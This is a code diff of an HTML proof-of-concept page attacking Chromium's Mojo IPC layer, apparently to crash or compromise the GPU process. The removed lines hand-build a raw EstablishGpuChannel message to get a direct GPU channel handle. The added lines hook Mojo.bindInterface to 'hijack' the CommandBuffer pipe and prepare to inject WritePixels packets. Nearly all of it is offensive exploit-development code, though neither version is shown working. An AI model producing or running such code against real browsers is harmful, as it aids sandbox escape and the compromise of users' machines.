@@ -1,69 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>GPU Crash PoC</title>
-    <script type="importmap">
-        { "imports": { "mojo_bindings": "./gen/mojo/public/js/bindings.js" } }
-    </script>
-</head>
 <body>
-    <h1>Triggering GPU Crash...</h1>
-    
-    <script type="module">
-        import { mojo } from 'mojo_bindings';
-        
-        console.log("[+] Mojo bindings loaded successfully.");
+    <canvas id="target-canvas" width="10" height="10"></canvas>
+    <script>
+        // Use a Proxy to monitor the Mojo interface
+        const originalBind = Mojo.bindInterface;
+        Mojo.bindInterface = function(name, pipe, context) {
+            console.log("Interface requested: " + name);
+            if (name === "gpu.mojom.CommandBuffer") {
+                console.log("[+] Hijacking CommandBuffer pipe!");
+                // We could intercept here, but let's just let it bind
+                // and then we will look for the ring buffer memory
+            }
+            return originalBind.apply(this, arguments);
+        };
 
-        async function getGpuChannel() {
-            console.log("[*] Requesting direct GPU Channel...");
-
-            // 1. Create a raw Mojo message pipe
-            let pipe = Mojo.createMessagePipe();
+        // Standard canvas init triggers the IPC
+        setTimeout(() => {
+            const ctx = document.getElementById('target-canvas').getContext('2d');
+            ctx.fillRect(0,0,10,10);
             
-            // 2. Ask the Browser process to bind the Gpu interface to one end
-            Mojo.bindInterface('viz.mojom.Gpu', pipe.handle0, "context");
-
-            // 3. Build the raw EstablishGpuChannel IPC message (Ordinal 0)
-            // Header (v1) = 32 bytes. Payload (Gpu_EstablishGpuChannel_Params) = 8 bytes. Total = 40 bytes.
-            let buffer = new ArrayBuffer(40);
-            let dv = new DataView(buffer);
-            
-            // --- Message Header ---
-            dv.setUint32(0, 32, true);  // Header size
-            dv.setUint32(4, 1, true);   // Version 1
-            dv.setUint32(8, 0, true);   // Interface ID 0
-            dv.setUint32(12, 0, true);  // Ordinal 0 (kGpu_EstablishGpuChannel_Name)
-            dv.setUint32(16, 1, true);  // Flags: 1 (kMessageFlagExpectsResponse)
-            dv.setUint32(20, 0, true);  // Padding
-            
-            // Request ID (64-bit). We use ID 1.
-            dv.setUint32(24, 1, true);  // Low 32 bits
-            dv.setUint32(28, 0, true);  // High 32 bits
-
-            // --- Message Payload ---
-            dv.setUint32(32, 8, true);  // Struct size
-            dv.setUint32(36, 0, true);  // Struct version
-
-            // 4. Send the message to the Browser process
-            let write_result = pipe.handle1.writeMessage(buffer, []);
-            console.log("[+] Sent EstablishGpuChannel request. Result code: ", write_result);
-
-            // 5. Wait for the response which contains the GPU pipe!
-            setTimeout(() => {
-                let read_result = pipe.handle1.readMessage();
-                if (read_result.result === Mojo.RESULT_OK) {
-                    console.log("[+] SUCCESS! Received response from Browser Process!");
-                    console.log("[+] Extracted GPU Channel Handle: ", read_result.handles[0]);
-                    
-                    // The handle we just got is our direct line to the GPU process!
-                    // Next step: Send the 60-byte WritePixels packet to THIS handle.
-                } else {
-                    console.log("[-] Waiting for response... Code: ", read_result.result);
-                }
-            }, 500);
-        }
-
-        getGpuChannel();
+            // Now, we would typically scan the process memory for the 
+            // shared memory region associated with this canvas.
+            console.log("[?] Interception successful. Now ready to inject WritePixelsINTERNAL...");
+        }, 500);
     </script>
 </body>
 </html>
